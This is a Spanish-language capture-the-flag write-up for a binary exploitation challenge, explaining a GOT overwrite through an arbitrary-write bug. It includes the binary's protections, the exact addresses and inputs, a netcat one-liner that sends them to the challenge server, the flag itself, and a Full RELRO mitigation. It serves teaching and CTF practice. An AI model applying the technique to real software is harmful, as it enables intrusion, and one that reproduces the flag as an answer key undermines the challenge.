# Show me what you GOT! - PWN Challenge

## Información del Reto

- **Categoría:** PWN / Binary Exploitation
- **Dificultad:** Fácil-Media
- **Servicio:** `nc chall.0xfun.org 24263`
- **Técnica:** GOT Overwrite via Arbitrary Write

## Descripción

"Bring it on! Show me EVERYTHING you've got! I want to see all you've got!"

## Archivos

- `chall` - Binario vulnerable (ELF 64-bit)
- `exploit.py` - Exploit funcional
- `WRITEUP.md` - Writeup completo con análisis detallado

## FLAG

```
0xfun{g3tt1ng_schw1fty_w1th_g0t_0v3rwr1t3s_1384311_m4x1m4l}
```

## Quick Start

```bash
# Analizar el binario
checksec chall
r2 -A chall

# Ejecutar el exploit
python3 exploit.py
```

## Vulnerabilidad

**Arbitrary Write (write-what-where):**

El programa lee dos números y ejecuta:
```c
scanf("%lu", &address);
scanf("%lu", &value);
*(uint64_t *)address = value;  // Sin validación!
```

## Técnica de Explotación

**GOT Overwrite:**

1. El binario tiene **No RELRO** → GOT es writable
2. Hay una función `win()` que lee y muestra `flag.txt`
3. Sobrescribimos `puts@got` con la dirección de `win()`
4. Cuando `main` llama a `puts("Goodbye!")`, ejecuta `win()` en su lugar
5. ¡FLAG obtenida!

## Protecciones del Binario

```
RELRO:      No RELRO      ← ¡GOT writable!
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE        ← Direcciones fijas
```

## Exploit Flow

```
Input 1: 4207664 (puts@got = 0x403430)
Input 2: 4198966 (win = 0x401236)

Resultado: puts@got → win

main() → puts("Goodbye!") → win() → FLAG!
```

## Conceptos Clave

- **GOT (Global Offset Table):** Tabla de direcciones de funciones de librerías dinámicas
- **Arbitrary Write:** Capacidad de escribir valores arbitrarios en direcciones arbitrarias
- **No RELRO:** Permite que la GOT sea modificable durante la ejecución
- **Win Function:** Función que nos da la flag al ser ejecutada

## Mitigación

Para prevenir este tipo de ataques:

```bash
# Compilar con Full RELRO
gcc -o chall chall.c -z relro -z now
```

Esto hace que la GOT sea read-only después de la resolución de símbolos.

---

**Referencia Rápida:**

| Dirección | Símbolo | Valor |
|-----------|---------|-------|
| 0x401236 | win | Función que lee flag.txt |
| 0x403430 | puts@got | Target del overwrite |

**One-liner exploit:**
```bash
echo -e "4207664\n4198966" | nc chall.0xfun.org 24263
```
